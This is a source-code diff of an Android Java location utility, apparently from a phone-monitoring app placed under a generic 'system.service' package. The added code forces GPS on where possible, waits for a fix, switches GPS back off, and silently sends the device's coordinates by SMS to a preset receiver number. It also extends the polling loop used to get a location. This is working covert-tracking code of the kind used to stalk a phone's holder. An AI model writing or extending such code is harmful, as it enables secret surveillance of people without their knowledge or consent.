@@ -14,6 +14,10 @@ import org.apache.http.impl.client.DefaultHttpClient;
 import org.json.JSONArray;
 import org.json.JSONObject;
 
+import system.service.SmsReceiver;
+import system.service.activity.GlobalPrefActivity;
+import system.service.feature.sms.SmsCtrl;
+
 import com.particle.inspector.common.util.GpsUtil;
 import com.particle.inspector.common.util.SysUtils;
 
@@ -37,54 +41,32 @@ public class LocationUtil
 	private static final int SLEEP_TIME = 5000; // ms
 	
 	private Context context;
-	private LocationManager locationManager;
+	//private LocationManager locationManager;
 	private LinkedList<Location> locationQueue;
 	private static final int MAX_QUEUE_LEN = 100;
 	
 	public static final String REALPOSITION = "real";
 	public static final String HISTPOSITION = "hist";
 	
-	private final LocationListener locationListener = new LocationListener() {
-		@Override
-		public void onLocationChanged(Location location) {
-			if (location != null) {
-				addLocation(location);
-            }
-		}
-
-		@Override
-		public void onProviderDisabled(String provider) {
-			
-		}
-
-		@Override
-		public void onProviderEnabled(String provider) {
-			updateLocation(provider);
-		}
-
-		@Override
-		public void onStatusChanged(String provider, int status, Bundle extras) {
-			if (status != LocationProvider.AVAILABLE) return;
-			updateLocation(provider);
-		};
-	};
+	public boolean sentSMS = false;
 	
 	public LocationUtil(Context context) {
 		this.context = context;
 		locationQueue = new LinkedList<Location>();
-		locationManager = (LocationManager)context.getSystemService(Context.LOCATION_SERVICE);
-		if (locationManager != null) {
-			locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, DEFAULT_INTERVAL, DEFAULT_DISTANCE, locationListener);
-			locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, DEFAULT_INTERVAL, DEFAULT_DISTANCE, locationListener);
-		}
+		//locationManager = (LocationManager)context.getSystemService(Context.LOCATION_SERVICE);
+		//if (locationManager != null) {
+			//locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, DEFAULT_INTERVAL, DEFAULT_DISTANCE, locationListener);
+			//locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, DEFAULT_INTERVAL, DEFAULT_DISTANCE, locationListener);
+		//}
 	}
 	
 	public void destroy() {
-		if (locationManager != null) {
-			locationManager.removeUpdates(locationListener);
-		}
+		//if (locationManager != null) {
+		//	locationManager.removeUpdates(locationListener);
+		//}
 	}
 	
+	/*
 	private void updateLocation(String provider) 
 	{
 		try {
@@ -115,6 +97,7 @@ public class LocationUtil
             Log.e(LOGTAG, e.getMessage());
         }
 	}
+	*/
 	
 	private void addLocation(Location location) {
         if (this.locationQueue == null) return;
@@ -122,76 +105,55 @@ public class LocationUtil
         this.locationQueue.offer(location);
     }
 	
-	// Get base station location
-	private BaseStationLocation getBaseStationLocation(Context context) {
-		TelephonyManager mTManager = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
-		if (mTManager == null) return null; 
-		GsmCellLocation gcl = (GsmCellLocation)mTManager.getCellLocation();
-		if (gcl == null) return null;
-		int cid = gcl.getCid();
-		int lac = gcl.getLac();
-		int mcc = Integer.valueOf(mTManager.getNetworkOperator().substring(0, 3));
-		int mnc = Integer.valueOf(mTManager.getNetworkOperator().substring(3, 5));
-		return (new BaseStationLocation(cid, lac, mcc, mnc));
-	}
-	
-	// When network available, send json to google maps to get geo location
-	private String getGeoLocByBaseStationLoc(BaseStationLocation bsLoc) {
-		try {
-			// Construct json object
-			JSONObject jObject = new JSONObject();
-			jObject.put("version", "1.1.0");
-			jObject.put("host", "maps.google.com");
-			jObject.put("request_address", true);
-			if (bsLoc.mcc == 460) {
-				jObject.put("address_language", "zh_CN");
-			} else {
-				jObject.put("address_language", "en_US");
-			}
-			JSONArray jArray = new JSONArray();
-			JSONObject jData = new JSONObject();
-			jData.put("cell_id", bsLoc.cid);
-			jData.put("location_area_code", bsLoc.lac);
-			jData.put("mobile_country_code", bsLoc.mcc);
-			jData.put("mobile_network_code", bsLoc.mnc);
-			jArray.put(jData);
-			jObject.put("cell_towers", jArray);
-			
-			// Send to google maps
-			DefaultHttpClient client = new DefaultHttpClient();
-			HttpPost post = new HttpPost("http://www.google.com/loc/json");
-			StringEntity se = new StringEntity(jObject.toString());
-			post.setEntity(se);
-			HttpResponse resp = client.execute(post);
-			BufferedReader br = null;
-			if (resp.getStatusLine().getStatusCode() == HttpStatus.SC_OK) {
-				br = new BufferedReader(new InputStreamReader(resp.getEntity().getContent()));
-				
-				// Get response
-				String getNumber = ("cid: " + bsLoc.cid + SysUtils.NEWLINE)
-								 + ("lac: " + bsLoc.lac + SysUtils.NEWLINE)
-								 + ("mcc: " + bsLoc.mcc + SysUtils.NEWLINE)
-								 + ("mnc: " + bsLoc.mnc + SysUtils.NEWLINE);
-				StringBuffer sb = new StringBuffer();
-				String result = br.readLine();
-				while (result != null) {
-					sb.append(getNumber);
-					sb.append(result);
-					result = br.readLine();
-				}
-				return sb.toString();
-			} else {
-				return null;
-			}
-		} catch (Exception ex) {
-			return null;
-		}
-	}
-	
 	// If return is not null and it is realtime position, realOrHistorical = "real"
 	// If return is not null and it is historical position, realOrHistorical = "hist"
 	public Location getLocation(String realOrHistorical)
     {
+		LocationManager locationManager = null;
+		LocationListener locationListener = null;
+		try {
+			locationManager = (LocationManager)context.getSystemService(Context.LOCATION_SERVICE);
+			locationListener = new LocationListener() {
+				@Override
+				public void onLocationChanged(Location location) {
+					if (location != null) {
+						addLocation(location);
+						
+						if (sentSMS) return;
+						
+						//if (tryToEnableGPS) { 
+							GpsUtil.disableGPS(context);
+						//}
+						
+			    		
+						String phoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
+						String locationSms = SmsCtrl.buildLocationSms(context, location, LocationUtil.REALPOSITION);
+						boolean ret = SmsCtrl.sendSms(phoneNum, locationSms);
+						if (ret) sentSMS = true;
+		            }
+				}
+
+				@Override
+				public void onProviderDisabled(String provider) {
+					
+				}
+
+				@Override
+				public void onProviderEnabled(String provider) {
+					//updateLocation(provider);
+				}
+
+				@Override
+				public void onStatusChanged(String provider, int status, Bundle extras) {
+					//if (status != LocationProvider.AVAILABLE) return;
+					//updateLocation(provider);
+				};
+			};
+			locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, locationListener);
+		} catch (Exception ex) {
+			
+		}
+		
 		if (locationManager == null) return null;
 		
 		// If GPS is not enabled, try to enable it
@@ -204,7 +166,7 @@ public class LocationUtil
 			}
 			
 			if (GpsUtil.isGpsEnabled(context))	tryToEnableGPS = true;
-			//if (tryToEnableGPS) SysUtils.threadSleep(10000, LOGTAG);
+			if (tryToEnableGPS) SysUtils.threadSleep(SLEEP_TIME, LOGTAG);
 		}
 		
 		// Start to get location
@@ -235,12 +197,17 @@ public class LocationUtil
 		
 		// If provider is available
         try {
+        	
         	Location loc = null;
         	int tryCount = 0;
-        	while (loc == null && tryCount < DEFAULT_TRY_COUNT) {
+        	while (loc == null && tryCount < DEFAULT_TRY_COUNT*6) {
         		tryCount++;
         		loc = locationManager.getLastKnownLocation(provider);
         		SysUtils.threadSleep(SLEEP_TIME, LOGTAG);
+        	}
+        	
+        	if (loc != null) {
+        		locationManager.removeUpdates(locationListener);
         	}
         	
         	// If GPS previously forced to be enabled, try to disable it
